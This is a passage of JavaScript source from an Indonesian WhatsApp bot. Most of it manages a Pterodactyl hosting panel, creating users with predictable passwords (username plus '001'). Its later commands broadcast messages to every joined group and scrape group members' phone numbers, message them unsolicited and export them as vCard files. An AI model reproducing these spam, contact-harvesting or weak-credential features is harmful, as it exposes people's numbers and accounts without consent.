"Authorization": "Bearer " + apikeyy
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}
⎙─➤ *😎PEMILIK SERVER* : *${namaCreator}*


NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
Biiofc.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: Biiofc.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "6gb": {
if (!isPremium && !isOwner) return reply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "Premium"
let egg = global.eggsnya
let loc = global.location
let memo = "6000"
let cpu = "450"
let disk = "0"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/45b3f02531a5a32793366.jpg" 
if (!u) return
let d = (await Biiofc.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}
⎙─➤ *😎PEMILIK SERVER* : *${namaCreator}*


NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
Biiofc.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: Biiofc.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "7gb": {
if (!isPremium && !isOwner) return reply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "Premium"
let egg = global.eggsnya
let loc = global.location
let memo = "7000"
let cpu = "400"
let disk = "0"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/45b3f02531a5a32793366.jpg" 
if (!u) return
let d = (await Biiofc.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}
⎙─➤ *😎PEMILIK SERVER* : *${namaCreator}*


NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
Biiofc.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: Biiofc.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "8gb": {
if (!isPremium && !isOwner) return reply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "Premium"
let egg = global.eggsnya
let loc = global.location
let memo = "8000"
let cpu = "450"
let disk = "0"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/45b3f02531a5a32793366.jpg" 
if (!u) return
let d = (await Biiofc.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}
⎙─➤ *😎PEMILIK SERVER* : *${namaCreator}*


NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
Biiofc.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: Biiofc.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}

break
case "9gb": {
if (!isPremium && !isOwner) return reply(mess.only.premium)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username + "Premium"
let egg = global.eggsnya
let loc = global.location
let memo = "9000"
let cpu = "500"
let disk = "0"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/45b3f02531a5a32793366.jpg" 
if (!u) return
let d = (await Biiofc.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}
⎙─➤ *😎PEMILIK SERVER* : *${namaCreator}*

NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
Biiofc.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: Biiofc.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`
*SUCCESSFULLY ADD USER + SERVER*
TYPE: user
ID: ${user.id}
NAME: ${user.first_name} ${user.last_name}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%

`)

}
            case 'suspend': {
            if (!isOwner) return reply(`Khusus Rafathar Offcial Aja`)
            let srv = args[0]
            if (!srv) return reply('ID nya mana?')
            let f = await fetch(domain + "/api/application/servers/" + srv + "/suspend", {
                "method": "POST",
                "headers": {
                    "Accept": "application/json",
                    "Content-Type": "application/json",
                    "Authorization": "Bearer " + apikeyy
                }
            })
            let res = f.ok ? {
                errors: null
            } : await f.json()
            if (res.errors) return reply('*SERVER NOT FOUND*')
            reply('*BERHASIL SUSPEND..*')
        }
            break
            case 'unsuspend': {
            if (!isOwner) return reply(`Khusus Rafathar Offcial Aja`)
            let srv = args[0]
            if (!srv) return reply('ID nya mana?')
            let f = await fetch(domain + "/api/application/servers/" + srv + "/unsuspend", {
                "method": "POST",
                "headers": {
                    "Accept": "application/json",
                    "Content-Type": "application/json",
                    "Authorization": "Bearer " + apikeyy
                }
            })
            let res = f.ok ? {
                errors: null
            } : await f.json()
            if (res.errors) return reply('*SERVER NOT FOUND*')
           reply('*BERHASIL BUKA SUSPEND..*')
        }
            break
case "listadmin1": {
  if (!isOwner) return reply(`Maaf, Anda tidak dapat melihat daftar pengguna.`);
  let page = args[0] ? args[0] : '1';
  let f = await fetch(domain + "/api/application/users?page=" + page, {
    "method": "GET",
    "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikeyy
    }
  });
  let res = await f.json();
  let users = res.data;
  let messageText = "Berikut list admin:\n\n";

  for (let user of users) {
    let u = user.attributes;
    if (u.root_admin) {
      messageText += `ID: ${u.id} - Status: ${u.attributes?.user?.server_limit === null ? 'Inactive' : 'Active'}\n`;
      messageText += `${u.username}\n`;
      messageText += `${u.first_name} ${u.last_name}\n\n`;
    }
  }

  messageText += `Page: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
  messageText += `Total Admin: ${res.meta.pagination.count}`;

  await Biiofc.sendMessage(m.chat, { text: messageText }, { quoted: m });

  if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
    m.reply(`Gunakan perintah ${prefix}listadmin1 ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya.`);
  }
}
break;
case 'reinstall1': {
if (!isOwner) return reply(`Khusus Rafathar Offcial Aja`)
let srv = args[0]
if (!srv) return reply('ID nya mana?')
let f = await fetch(domain + "/api/application/servers/" + srv + "/reinstall", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy
}
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return reply('*SERVER NOT FOUND*')
reply('*REINSTALLING THE SERVER..*')
}
break
case "delusr1": {
  if (!isOwner && !isPremium) return reply(`KHUSUS Owner + Premium`)
let usr = args[0]
if (!usr) return reply('ID nya mana?')
let f = await fetch(domain + "/api/application/users/" + usr, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy
}
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return reply('*USER NOT FOUND*')
reply('*SUCCESSFULLY DELETE THE USER*')
}
        break
case "delsrv1": {
      if (!isOwner && !isPremium) return reply(`KHUSUS Owner + Premium`)

let srv = args[0]
if (!srv) return reply('ID nya mana?')
let f = await fetch(domain + "/api/application/servers/" + srv, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy,
}
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return reply('*SERVER NOT FOUND*')
reply('*SUCCESSFULLY DELETE THE SERVER*')
}
        break
case 'updatesrv1': {
if (!isOwner) return reply(`Khusus Rafathar Offcial Aja`)
let t = text.split(',');
if (t.length < 4) return reply(`*Format salah*

Penggunaan:
${prefix + command} srvId,locId,memory/disk,cpu`)
let srv = t[0];
let loc = t[1];
let memo_disk = t[2].split`/`;
let cpu = t[3];
let f1 = await fetch(domain + "/api/application/servers/" + srv, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy
}
})
let data = await f1.json()

let f = await fetch(domain + "/api/application/servers/" + srv + "/build", {
"method": "PATCH",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikeyy
},
"body": JSON.stringify({
"allocation": parseInt(loc) || data.attributes.allocation,
"memory": memo_disk[0] || data.attributes.limits.memory,
"swap": data.attributes.limits.swap || 0,
"disk": memo_disk[1] || data.attributes.limits.disk,
"io": 500,
"cpu": cpu || data.attributes.limits.cpu,
"threads": null,
"feature_limits": {
"databases": 5,
"allocations": 5,
"backups": 5
}
})
})
let res = await f.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
reply(`*SUCCESSFULLY UPDATED THE SERVER*

TYPE: ${res.object}

ID: ${server.id}
UUID: ${server.uuid}
NAME: ${server.name}
DESCRIPTION: ${server.description}
MEMORY: ${server.limits.memory === 0 ? 'Unlimited' : server.limits.memory} MB
DISK: ${server.limits.disk === 0 ? 'Unlimited' : server.limits.disk} MB
CPU: ${server.limits.cpu}%
CREATED AT: ${week} ${date}
UPDATED AT: ${server.updated_at}`)
}
break
 case "listusr1": {
if (!isOwner && !isPremium) return reply(`KHUSUS Owner + Premium`)
  let page = args[0] ? args[0] : '1';
  let f = await fetch(domain + "/api/application/users?page=" + page, {
    "method": "GET",
    "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikeyy
    }
  });
  let res = await f.json();
  let users = res.data;
  let messageText = "Berikut list user:\n\n";
  
  for (let user of users) {
    let u = user.attributes;
    messageText += `ID: ${u.id} - Status: ${u.attributes?.user?.server_limit === null ? 'Inactive' : 'Active'}\n`;
    messageText += `${u.username}\n`;
    messageText += `${u.first_name} ${u.last_name}\n\n`;
  }
  
  messageText += `Page: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
  messageText += `Total Users: ${res.meta.pagination.count}`;
  
  await Biiofc.sendMessage(m.chat, { text: messageText }, { quoted: m });
  
  if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
    reply(`Gunakan perintah ${prefix}listusr1 ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya.`);
  }
}
break;
case "listsrv1": {
  if (!isOwner && !isPremium) return reply(`Maaf, Anda tidak dapat melihat daftar server.`);
  let page = args[0] ? args[0] : '1';
  let f = await fetch(domain + "/api/application/servers?page=" + page, {
    "method": "GET",
    "headers": {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikeyy
    }
  });
  let res = await f.json();
  let servers = res.data;
  let sections = [];
  let messageText = "Berikut adalah daftar server:\n\n";
  
  for (let server of servers) {
    let s = server.attributes;
    
    let f3 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
      "method": "GET",
      "headers": {
        "Accept": "application/json",
        "Content-Type": "application/json",
        "Authorization": "Bearer " + capikeyy
      }
    });
    
    let data = await f3.json();
    let status = data.attributes ? data.attributes.current_state : s.status;
    
    messageText += `ID Server: ${s.id}\n`;
    messageText += `Nama Server: ${s.name}\n`;
    messageText += `Status: ${status}\n\n`;
  }
  
  messageText += `Halaman: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
  messageText += `Total Server: ${res.meta.pagination.count}`;
  
  await Biiofc.sendMessage(m.chat, { text: messageText }, { quoted: m });
  
  if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
    reply(`Gunakan perintah ${prefix}listsrv1 ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya.`);
  }
}
break;    
case 'mediafire': {
if (cekUser("id", sender) == null) return Biiofc.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya  kamu blom terdaftar di database Silahkan daftar  terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted:m})
if (!isOwner) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
	if (args.length == 0) return reply(`Link Nya Tuan?`)
	if (!isUrl(args[0]) && !args[0].includes('mediafire.com')) return reply(`The link you provided is invalid`)
	const { mediafireDl } = require('./freya/mediafire.js')
	const baby1 = await mediafireDl(text)
	if (baby1[0].size.split('MB')[0] >= 100) return reply('Oops, the file is too big...')
	const result4 = `*MEDIAFIRE DOWNLOADER*

*❖ Name* : ${baby1[0].nama}
*❖ Size* : ${baby1[0].size}
*❖ Mime* : ${baby1[0].mime}
*❖ Link* : ${baby1[0].link}`
reply(`${result4}`)
Biiofc.sendMessage(m.chat, { document : { url : baby1[0].link}, fileName : baby1[0].nama, mimetype: baby1[0].mime }, { quoted : m })
}
break
  case "jpm":{
if (!isOwner) return reply(`Khusus SanZ Offcial Aja`)
if (!text) return reply(`*Penggunaan Salah Silahkan Gunakan Seperti Ini*\n${prefix+command} teks|jeda\n\nReply Gambar Untuk Mengirim Gambar Ke Semua Group\nUntuk Jeda Itu Delay Jadi Nominal Jeda Itu 1000 = 1 detik`)
await reply("_Wait Tuan Ku✅_")
let getGroups = await Biiofc.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
for (let xnxx of anu) {
let metadat72 = await Biiofc.groupMetadata(xnxx)
let participanh = await metadat72.participants
if (/image/.test(mime)) {
media = await Biiofc.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(media)
await Biiofc.sendMessage(xnxx, { image: { url: mem }, caption: text.split('|')[0]})
await sleep(text.split('|')[1])
} else {
await Biiofc.sendMessage(xnxx, { text: text.split('|')[0]})
await sleep(text.split('|')[1])
}}
reply("*SUCCESFUL TUAN SanZ✅*")
}
break
case "jpmtag":{
if (!isOwner) return reply(`Khusus Rafathar Offcial Aja`)
if (!text) return reply(`*Penggunaan Salah Silahkan Gunakan Seperti Ini*\n${prefix+command} teks|jeda\n\nReply Gambar Untuk Mengirim Gambar Ke Semua Group\nUntuk Jeda Itu Delay Jadi Nominal Jeda Itu 1000 = 1 detik`)
await reply("_Wait Tuan Ku✅_")
let getGroups = await Biiofc.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
for (let xnxx of anu) {
let metadat72 = await Biiofc.groupMetadata(xnxx)
let participanh = await metadat72.participants
if (/image/.test(mime)) {
media = await Biiofc.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(media)
await Biiofc.sendMessage(xnxx, { image: { url: mem }, caption: text.split('|')[0], mentions: participanh.map(a => a.id) })
await sleep(text.split('|')[1])
} else {
await Biiofc.sendMessage(xnxx, { text: text.split('|')[0], mentions: participanh.map(a => a.id) })
await sleep(text.split('|')[1])
}}
reply("*SUCCESFUL TUAN SanZ ✅*")
}
break   
case "pushkontakv1":{
if (!isOwner) return reply(`Khusus SanZ Offcial Aja`)
if (isGroup) return reply(mess.only.private)
if (!text) return reply(`Penggunaan Salah Silahkan Gunakan Command Seperti Ini\n${prefix+command} idgroup|tekspushkontak\nUntuk Liat Id Group Silahkan Ketik .cekidgc`)
reply(mess.wait)
const groupMetadataa = !isGroup? await Biiofc.groupMetadata(`${text.split("|")[0]}`).catch(e => {}) : ""
const participants = !isGroup? await groupMetadataa.participants : ""
const halls = await participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
global.tekspushkon = text.split("|")[1]
if (isContacts) return
for (let mem of halls) {
if (isContacts) return
contacts.push(mem)
fs.writeFileSync('./all/database/contacts.json', JSON.stringify(contacts))
if (/image/.test(mime)) {
media = await Biiofc.downloadAndSaveMediaMessage(quoted)
memk = await uptotelegra(media)
await Biiofc.sendMessage(mem, { image: { url: memk }, caption: global.tekspushkon })
await sleep(1000)
} else {
await Biiofc.sendMessage(mem, { text: global.tekspushkon })
await sleep(1000)
}
}
try {
const uniqueContacts = [...new Set(contacts)];
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:WA[${createSerial(1)}] ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n");
return vcard; }).join("");
fs.writeFileSync("./all/database/contacts.vcf", vcardContent, "utf8");
} catch (err) {
reply(util.format(err))
} finally {
await Biiofc.sendMessage(from, { document: fs.readFileSync("./all/database/contacts.vcf"), fileName: "contacts.vcf", caption: "Nih Kak Tinggal Pencet File Di Atas Terus Save", mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
fs.writeFileSync("./all/database/contacts.json", JSON.stringify(contacts))
}
}
break
case "pushkontakv2":{
if (!isOwner) return reply(`Khusus SanZ Offcial Aja`)
if (!isGroup) return reply(mess.only.group)
if (!text) return reply(`Penggunaan Salah Silahkan Gunakan Command Seperti Ini\n${prefix+command} teks`)
reply(mess.wait)
const groupMetadata = isGroup? await Biiofc.groupMetadata(from).catch(e => {}) : ""
const groupOwner = isGroup? groupMetadata.owner : ""
const participantts = isGroup? await groupMetadata.participants : ""
const halsss = await participantts.filter(v => v.id.endsWith('.net')).map(v => v.id)
global.tekspushkonv2 = text
if (isContacts) return
for (let men of halsss) {
contacts.push(men)
fs.writeFileSync('./all/database/contacts.json', JSON.stringify(contacts))
if (/image/.test(mime)) {
media = await Biiofc.downloadAndSaveMediaMessage(quoted)
mem = await uptotelegra(media)
await Biiofc.sendMessage(men, { image: { url: mem }, caption: global.tekspushkonv2 })
await sleep(1000)
} else {
await Biiofc.sendMessage(men, { text: global.tekspushkonv2 })
await sleep(1000)
}
}
reply("File Kontak Sudah Di Kirim Lewat Chat Pribadi")
try {
const uniqueContacts = [...new Set(contacts)];
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:WA[${createSerial(1)}] ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n");
return vcard; }).join("");
fs.writeFileSync("./all/database/contacts.vcf", vcardContent, "utf8");
} catch (err) {
reply(util.format(err))
} finally {
await Biiofc.sendMessage(sender, { document: fs.readFileSync("./all/database/contacts.vcf"), fileName: "contacts.vcf", caption: "Nih Kak Tinggal Pencet File Di Atas Terus Save", mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
fs.writeFileSync("./all/database/contacts.json", JSON.stringify(contacts))
}
}
break
case 'ss': case 'ssweb': {
if (!q) return reply(`Example ${prefix+command} link`)
reply(mess.wait)
let krt = await scp1.ssweb(q)
Biiofc.sendMessage(from,{image:krt.result,caption:mess.succes}, {quoted:m})
}
break
case "pushkontakv3":
if (!isOwner) return reply(`Khusus SanZ Offcial Aja`)
if (!text) return reply(`Penggunaan Salah Silahkan Gunakan Command Seperti Ini\n${prefix+command} idgroup|jeda|teks\nUntuk Liat Id Group Silahkan Ketik .idgroup`)
await reply("Otw Boskuuu")
const groupMetadataa = !isGroup? await Biiofc.groupMetadata(`${q.split("|")[0]}`).catch(e => {}) : ""
const participantss = !isGroup? await groupMetadataa.participants : ""
const halls = await participantss.filter(v => v.id.endsWith('.net')).map(v => v.id)
global.tekspushkonv3 = q.split("|")[2]
for (let mem of halls) {
if (/image/.test(mime)) {
media = await Biiofc.downloadAndSaveMediaMessage(quoted)
memk = await uptotelegra(media)
